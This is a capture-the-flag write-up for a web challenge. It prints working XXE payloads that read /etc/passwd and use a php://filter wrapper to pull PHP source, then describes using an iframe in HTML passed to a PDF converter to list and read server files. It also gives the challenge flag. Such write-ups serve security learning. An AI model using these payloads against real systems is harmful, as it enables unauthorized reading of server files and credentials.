# Include me
## Description

> Zero Dollar Security is hiring infosec enthusiast. Apply ASAP. Connect at chall.ctf-ehcon.ml:32104

## Solution

This application just has register function

![Register function](./img/Include%20me/register.png)

Use Burp Suite to intercept the request.
- As we see, body of the request is XML
- The response has the `username` has sent before

--> This might contain XXE vulnerability 

![Register function](./img/Include%20me/register-burp.png)

The first we try to read a file such as `/etc/passwd` 
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [	
        <!ENTITY ext SYSTEM "file:///etc/passwd"> 
    ]>
    <root>
        <email>&ext;</email>
        <password>none</password>
    </root>
```

![XXE](./img/Include%20me/read-file-xxe.png)

That's good, continue reading other files such as `flag.txt`, `flag.php`... but I get nothing.

When I'm trying to list directory, I receive a strange response having a newline character `\n` 

![New hint](./img/Include%20me/read-file-2.png)

Nice, use another method to read or list directory. Because I knew this application use `PHP`, therefore I use PHP wrapper to read file
- File `flag.php` is guessed
	
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [	
        <!ENTITY ext SYSTEM "php://filter/convert.base64-encode/resource=flag.php">  
    ]>
    <root>
        <email>&ext;</email>
        <password>none</password>
    </root>
```

![Read file with PHP wrapper](./img/Include%20me/read-file-base64.png)

Okay good response, take this to base64 decode. Read this code a bit
- It takes param `content` in request using `POST` method
- Put `content` into created file with given `content` 
- Pass 2 file `.html` and `.pdf` to `/var/www/html/files/` 
```php
<?php
if (($_SERVER["REQUEST_METHOD"] ?? 'GET') == 'POST'){
    if(isset($_POST["content"])){
       $file_name=rand(4060,9999).'.html';
        file_put_contents("files/".$file_name,$_POST["content"]);
        passthru("java -Xmx512m -Djava.awt.headless=true -cp /var/www/html/pd4ml_demo.jar Pd4Cmd file:////var/www/html/files/$file_name 800 A4 -out /var/www/html/files/result.pdf");
    }
    else{
	echo "Try harder!!, pal";
	}
}
else{
    echo "Try harder!!!, pal";
}
?>
```
What did I get through this snippet code?
- We can put our payload into a file `html` 
- A new directory `/var/www/html/files/` 

Well, observer new directory a bit

![Files directory](./img/Include%20me/directory-before-post.png)

Now, how can we capture the flag with controlable data HTML? Can we read file or list directory?

We can definately do it with `iframe` tag in HTML
--> LFI with iframe

Replace body of `POST` method from XML to `content`

![POST method](./img/Include%20me/post.png)

My payload:
- Diretory listing of `/` 

![Content param in POST method](./img/Include%20me/content.png)

After send the request, F5 the application we will get new files

![After post](./img/Include%20me/directory-after-post.png)

Nice, check out content of file `result.pdf` 

![List directory in /](./img/Include%20me/list-directory.png)

Where is the flag? Ah, it's in `/ctf/`. List directory in `/ctf/`

![List directory in /ctf/](./img/Include%20me/list-directory-ctf.png)

The flag was captured 🎉🎉

```
Flag is : EHACON{lf1_@nd_xx3_1s_fun}
```
